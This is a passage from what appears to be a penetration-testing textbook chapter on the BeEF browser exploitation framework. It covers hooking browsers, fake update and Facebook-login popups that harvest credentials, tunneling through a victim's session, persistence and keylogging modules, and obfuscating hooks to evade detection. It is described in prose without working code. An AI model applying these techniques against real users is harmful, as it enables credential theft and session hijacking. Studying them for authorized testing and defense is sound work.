      <li class="bulletList"><strong class="keyWord">Red</strong>: This indicates that the command module does not work against the target. It can be used, but its success is not guaranteed, and its use may be detected by the target.</li>
    </ul>
    <p class="normal">Take these indicators with a grain of salt, since variations in the client environment can make some commands ineffective or may cause other unintended results.</p>
    <p class="normal">To start an attack or hook a victim, we need to get the user to click on the hook URL, which takes the form of <code class="inlineCode">&lt;IP ADDRESS&gt;:&lt;PORT&gt;/hook.js</code>. This can be achieved using a variety of means, including:</p>
    <ul>
      <li class="bulletList">The original XSS vulnerabilities</li>
      <li class="bulletList">Man-in-the-middle attacks (especially the ones using BeEF Shank, an ARP spoofing tool that specifically targets intranet sites on internal networks)</li>
      <li class="bulletList">Social engineering attacks, including the BeEF web cloner and mass emailer, a custom hook point with iFrame impersonation, or the QR code generator</li>
    </ul>
    <p class="normal">Once the browser has been hooked, it is referred to as a zombie. Select the IP address of the zombie from the <strong class="screenText">Hooked Browsers</strong> panel on the left-hand side of the command interface and then refer to the available commands.</p>
    <p class="normal">In the example shown in the following screenshot, there are several different attacks and management options available for the hooked browser. One of the easiest attack options to use is the social engineering Clippy attack.</p>
    <p class="normal">When <strong class="screenText">Clippy</strong> is selected from <strong class="screenText">Module Tree</strong> under <strong class="screenText">Commands</strong>, a specific <strong class="screenText">Clippy</strong> panel is launched on the far right, as shown in the following screenshot. It allows you to adjust the image, the text delivered, and the executable that will be launched locally if the victim clicks on the supplied link. </p>
    <p class="normal">By default, the custom text informs the victim that their browser is out of date, offers to update it for them, downloads an executable (non-malicious), and then thanks the user for performing the upgrade. All of these options can be changed by<a id="_idIndexMarker877"/> the tester:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_41.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.41: BeEF Clippy module</p>
    <p class="normal">When Clippy is executed, the victim will see a message, as shown in <em class="italic">Figure 7.42</em>, on their browser:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_42.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.42: Victim browser with the BeEF module Clippy message</p>
    <p class="normal">This can be a very<a id="_idIndexMarker878"/> effective social engineering attack. When testing with clients, we have had success rates (the client downloaded a non-malicious indicator file) of approximately 70 percent.</p>
    <p class="normal">One of the more interesting attacks is pretty theft, which asks users for their username and password for popular sites. For example, the pretty theft option for Facebook can be configured by the tester, as shown in <em class="italic">Figure 7.43</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_43.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.43: Pretty theft module for fake Facebook popup</p>
    <p class="normal">When the attack<a id="_idIndexMarker879"/> is executed, the victim is presented with a popup that appears to be legitimate, as shown in <em class="italic">Figure 7.44</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_44.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.44: Victim’s browser with a fake Facebook session timeout</p>
    <p class="normal">In BeEF, the tester reviews the history log for the attack and can derive the username and password <a id="_idIndexMarker880"/>from the data field in the <strong class="screenText">Command results</strong> column, as shown in <em class="italic">Figure 7.45</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_45.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.45: BeEF module pretty theft capturing the data entered by the victim</p>
    <p class="normal">Another attack that can be quickly launched is old-fashioned phishing; once the browser is hooked to BeEF, it’s fairly simple to redirect the users to an attacker-controlled website.</p>
    <h2 id="_idParaDest-201" class="heading-2">Using BeEF as a tunneling proxy</h2>
    <p class="normal">Tunneling is<a id="_idIndexMarker881"/> the process of encapsulating a payload protocol inside a delivery protocol, such as IP. Using tunneling, you can transmit incompatible protocols across a network, or you can bypass firewalls that are configured to block a particular protocol. BeEF can be configured to act as a tunneling proxy that mimics a reverse HTTP proxy—the browser session becomes the tunnel, and the hooked browser is the exit point. This configuration is extremely useful when an internal network has been compromised because the tunneling proxy can be used to do the following:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Browse authenticated sites in the security context (client-side SSL certificates, authentication cookies, NTLM hashes, and so on) of the victim’s browser</li>
      <li class="numberedList">Spider the hooked domain using the security context of the victim’s browser</li>
      <li class="numberedList">Facilitate the use of tools such as SQL injection</li>
    </ol>
    <p class="normal">To use the tunneling proxy, select the hooked browser that you wish to target and right-click on its IP address. In the pop-up box, as shown in <em class="italic">Figure 7.46</em>, select the <strong class="screenText">Use as Proxy</strong> option:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_46.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.46: Activating a man-in-the-browser attack through proxy</p>
    <p class="normal">Configure a browser to use the BeEF tunneling proxy as an HTTP proxy. By default, the address of the proxy is <code class="inlineCode">127.0.0.1</code>, and the port is <code class="inlineCode">6789</code>. Attackers can utilize the <strong class="screenText">Forge Request</strong> and force the user to download payloads or ransomware from the attacker-controlled websites, as shown in <em class="italic">Figure 7.47</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_47.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.47: Forcing the victim to download content from remote sites</p>
    <p class="normal">If you visit a <a id="_idIndexMarker882"/>targeted website using the browser configured as the HTTP proxy, all raw request/response pairs will be stored in the BeEF database, which can be analyzed by navigating to <strong class="screenText">Rider</strong> | <strong class="screenText">History</strong>. An excerpt of the log is shown in <em class="italic">Figure 7.48</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_48.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.48: Logs of the forge HTTP request submitted on behalf of the victim</p>
    <p class="normal">Once an attack has<a id="_idIndexMarker883"/> been completed, there are some mechanisms to ensure that a persistent connection is retained, including the following:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Confirm close</strong>: This is a module that presents the victim with a <strong class="screenText">Confirm Navigation - are you sure you want to leave this page?</strong> popup when they try to close a tab. If the user elects to leave this page, it will not be effective, and the <strong class="screenText">Confirm Navigation</strong> popup will continue to present itself.</li>
      <li class="bulletList"><strong class="keyWord">Pop-under module</strong>: This is configured to autorun in <code class="inlineCode">config.yaml</code>. This module attempts to open a small pop-under window to keep the browser hooked if the victim closes the main browser tab. This may be blocked by pop-up blockers.</li>
      <li class="bulletList"><strong class="keyWord">iFrame keylogger</strong>: This facilitates rewrites of all of the links on a web page to an iFrame overlay that is 100 percent of the height and width of the original. For maximum effectiveness, it should be attached to a JavaScript keylogger. Ideally, you would load the login page of the hooked domain.</li>
      <li class="bulletList"><strong class="keyWord">Man-in-the-browser</strong>: This module ensures that whenever the victim clicks on any link, the next page will be hooked as well. The only way to avoid this behavior is to type a new address in the address bar.</li>
    </ul>
    <p class="normal">Finally, although BeEF provides an excellent series of modules to perform the reconnaissance, as well as the exploit and post-exploit phases of the kill chain, known default activities of BeEF (<code class="inlineCode">/hook.js</code> and server headers) are being used to detect attacks, reducing its effectiveness. </p>
    <p class="normal">Testers will have to obfuscate their attacks using techniques such as Base64 encoding, whitespace encoding, randomizing variables, and removing<a id="_idIndexMarker884"/> comments to ensure full effectiveness in the future.</p>
    <h1 id="_idParaDest-202" class="heading-1">Summary</h1>
    <p class="normal">In this chapter, we examined web apps and the user authorization services they provide from the perspective of an attacker. We applied the kill chain perspective to web applications and their services in order to understand the correct application of reconnaissance and vulnerability scanning.</p>
    <p class="normal">Several different techniques were presented; we focused on the hacker’s mindset while attacking a web application and looked at the methodology used when penetration testing a web application. We learned how client-side proxies can be used to perform various attacks, looked at tools to perform brute-forcing on websites, and covered OS-level commands through web applications. We completed the chapter with an examination of a web shell specific to web services.</p>
    <p class="normal">In <em class="chapterRef">Chapter 8</em>, <em class="italic">Cloud Security Exploitation</em>, we will learn how to identify and attack misconfigured cloud services that allow users to access resources, and how to escalate privileges to achieve the objective.</p>
  </div>
</body></html>